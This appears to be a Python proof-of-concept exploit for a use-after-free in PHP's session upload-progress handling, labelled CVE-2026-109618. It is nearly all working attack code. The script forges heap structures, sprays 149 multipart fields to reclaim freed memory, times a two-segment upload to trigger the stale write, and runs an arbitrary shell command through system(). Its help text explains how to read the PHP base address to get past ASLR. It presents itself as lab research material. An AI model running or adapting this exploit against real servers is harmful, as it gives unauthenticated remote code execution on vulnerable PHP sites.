#!/usr/bin/env python3
"""
CVE-2026-109618 -- stale post_bytes_processed exploit

Achieves unauthenticated RCE via session.upload_progress stale pointer.

The vulnerability: php_session_rfc1867_callback caches a zval* to
data["bytes_processed"] at the first FILE_START event. This pointer
is never refreshed. When a second progress update fires (after
session.upload_progress.min_freq seconds), zend_hash_update replaces
the progress array, and the old one is freed through pDestructor
(zval_ptr_dtor). The cached pointer now points to freed memory.

The exploit sends a single multipart upload in two TCP segments:
  Segment 1: progress field + file start + padding (triggers first
             progress update which caches the pointer)
  [stall for > min_freq seconds]
  Segment 2: more file data (triggers second update -> frees old
             progress tree), end file, spray parts (reclaim freed
             320-byte bin with forged zend_fcall_info), second file
             (FILE_DATA writes through stale pointer into controlled
             memory -> zend_call_function("system", cmd))

Requirements:
  - session.upload_progress.enabled = 1 (default)
  - fastcgi_request_buffering off (nginx) or mod_php/direct PHP
  - Known PHP binary base address (ASLR bypass or lab with known base)
  - PHP < 8.4.27 (pre-patch)

Adapted from eness/php2shell poc_109618.py for our Docker lab.
For authorized security research and local lab use only.
"""

import argparse
import socket
import struct
import sys
import time


# Struct layout constants
FCI_SIZE = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
ZEND_INTERNAL = 1

# Offsets for php:8.4.26-fpm Docker image (Debian bookworm)
DEFAULT_ZVAL_PTR_DTOR = 0x7038e0
DEFAULT_ZEND_CALL_FUNCTION = 0x6506f0
DEFAULT_DELTA = DEFAULT_ZVAL_PTR_DTOR - DEFAULT_ZEND_CALL_FUNCTION

# Heap spray: progress HashTable arData lands in 320-byte ZMM bin.
# zend_string with 288-byte value = 24 + 288 + 1 = 313, rounds to 320.
SPRAY_VALUE_LEN = 288
SPRAY_COUNT = 149
FILL_SIZE = 5120


def forge_fcall(call_addr, cmd):
    """Forge a zend_fcall_info + zend_internal_function in 288 bytes."""
    buf = bytearray(SPRAY_VALUE_LEN)
    struct.pack_into("<Q", buf, 0, FCI_SIZE)
    struct.pack_into("<Q", buf, 8, call_addr)
    struct.pack_into("<I", buf, 16, IS_STRING_EX)
    struct.pack_into("<I", buf, 48, 1)
    struct.pack_into("<B", buf, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", buf, 64 + 88, call_addr)
    struct.pack_into("<I", buf, 160, IS_OBJECT_EX)
    payload = b"system\x00" + cmd.encode() + b"\x00"
    buf[200:200 + min(len(payload), 80)] = payload[:80]
    return bytes(buf)


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_payload(session_id, cmd, call_addr, boundary):
    """Build two TCP segments for the stale-pointer exploit.

    Segment 1 (pre-stall):
      - PHP_SESSION_UPLOAD_PROGRESS field (activates progress tracking)
      - First file part header + fill data (triggers FILE_START + first update)

    Segment 2 (post-stall):
      - More file data (triggers second update -> frees old progress tree)
      - End file part
      - 149 spray parts (reclaim freed 320-byte bin)
      - Second file part (FILE_DATA triggers stale write)
    """
    spray = forge_fcall(call_addr, cmd)
    if boundary in spray:
        raise ValueError("Forged struct contains boundary")

    # Segment 1: progress field + start of first file upload
    seg1 = b""
    seg1 += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    seg1 += make_part(boundary, "f", b"", filename="a") + b"\r\n"
    seg1 += b"A" * (FILL_SIZE + 64)
    # NOTE: file "f" is still open -- we haven't sent its closing boundary

    # Segment 2: continue file "f" data, then close it and spray
    seg2 = b"B" * (FILL_SIZE + 64) + b"\r\n"
    # Close file "f"
    # Now spray: 149 form fields that reclaim the freed 320-byte bin
    for i in range(SPRAY_COUNT):
        seg2 += make_part(boundary, "t[]", spray) + b"\r\n"
    # Second file: its FILE_DATA writes through the stale post_bytes_processed
    seg2 += make_part(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
    seg2 += b"--" + boundary + b"--\r\n"

    return seg1, seg2


def send_exploit(host, port, path, session_id, seg1, seg2, boundary, stall):
    """Send two-segment request with slow drip + timing stall.

    The first progress update only fires after BOTH conditions are met:
      - session.upload_progress.freq (default 1%) of data received
      - session.upload_progress.min_freq (default 1s) elapsed
    So we drip-feed seg1 over >1s to ensure the first update fires
    and caches the post_bytes_processed pointer, then stall, then
    send seg2 which triggers the second update (frees + reclaims).
    """
    total = len(seg1) + len(seg2)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    try:
        sock.connect((host, port))

        # Send headers + multipart preamble (progress field + file header)
        # then drip the fill data over >1s to trigger first progress update
        preamble_end = seg1.find(b"A" * 10)
        if preamble_end < 0:
            preamble_end = min(500, len(seg1))
        preamble = seg1[:preamble_end]
        fill = seg1[preamble_end:]

        sock.sendall(headers + preamble)
        # Drip fill data in chunks over ~1.2 seconds
        chunk_size = max(64, len(fill) // 20)
        drip_delay = 1.2 / max(1, len(fill) // chunk_size)
        sent = 0
        while sent < len(fill):
            end = min(sent + chunk_size, len(fill))
            sock.sendall(fill[sent:end])
            sent = end
            time.sleep(drip_delay)

        print(f"    Seg1 dripped ({len(seg1)}B over ~1.2s), stalling {stall}s...", flush=True)
        time.sleep(stall)
        sock.sendall(seg2)
        print(f"    Seg2 sent ({len(seg2)}B), reading response...", flush=True)

        sock.settimeout(15)
        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return str(e).encode()


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 exploit (stale post_bytes_processed)")
    ap.add_argument("cmd", nargs="?", default="id",
                    help="Command to execute (default: id)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8898)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="php2shell-rce")
    ap.add_argument("--stall", type=float, default=1.35,
                    help="Seconds between segments (default: 1.35)")
    ap.add_argument("--base", default="",
                    help="PHP binary runtime base address (hex)")
    ap.add_argument("--call", default="",
                    help="zend_call_function runtime address (hex, overrides --base)")
    ap.add_argument("--attempts", type=int, default=5)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if args.call:
        call_addr = int(args.call, 0)
    elif args.base:
        call_addr = int(args.base, 0) + DEFAULT_ZEND_CALL_FUNCTION
    else:
        print("[!] Need --base (PHP runtime base) or --call (zend_call_function addr)")
        print()
        print("    Get the base from a running container:")
        print("      docker exec <container> cat /proc/1/maps | grep php-fpm | head -1")
        print("    Or for mod_php:")
        print("      docker exec <container> cat /proc/1/maps | grep libphp | head -1")
        return 1

    boundary = b"php2shell618"
    marker = "PHP2SHELL_RCE"
    full_cmd = f"{args.cmd}; echo {marker}"

    print("=" * 60)
    print("CVE-2026-109618 Exploit")
    print("=" * 60)
    print(f"  Target:  http://{args.host}:{args.port}{args.path}")
    print(f"  Command: {args.cmd}")
    print(f"  Call:    {hex(call_addr)}")
    print(f"  Spray:   {SPRAY_COUNT} x {SPRAY_VALUE_LEN}B -> 320-byte ZMM bin")
    print(f"  Stall:   {args.stall}s (must exceed min_freq, default 1s)")
    print()

    seg1, seg2 = build_payload("test", full_cmd, call_addr, boundary)
    print(f"  Seg1:    {len(seg1)} bytes")
    print(f"  Seg2:    {len(seg2)} bytes")
    print(f"  Total:   {len(seg1) + len(seg2)} bytes")
    print()

    if args.dry_run:
        with open("exploit-body.bin", "wb") as f:
            f.write(seg1 + seg2)
        print("[*] Wrote to exploit-body.bin")
        return 0

    for attempt in range(1, args.attempts + 1):
        sid = f"{args.sid}-{attempt}"
        seg1, seg2 = build_payload(sid, full_cmd, call_addr, boundary)

        print(f"[{attempt}/{args.attempts}]")
        resp = send_exploit(args.host, args.port, args.path, sid,
                           seg1, seg2, boundary, args.stall)

        if not resp:
            print("    No response (worker crash)")
            continue

        status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
        print(f"    {status} ({len(body)}B)")

        if marker.encode() in body or b"uid=" in body:
            print()
            print("[+] RCE CONFIRMED")
            idx = body.find(b"uid=")
            if idx < 0:
                idx = body.find(marker.encode())
            if idx >= 0:
                print(body[max(0, idx - 40):idx + 200].decode("latin-1", "replace"))
            return 0

        if b"500" in resp[:30]:
            print("    [*] 500 -- crash, but no output (offsets may be wrong)")
        print()

    print("[-] No RCE achieved.")
    print("    Check: base address, stall timing, nginx buffering=off, PHP < 8.4.27")
    return 1


if __name__ == "__main__":
    sys.exit(main())
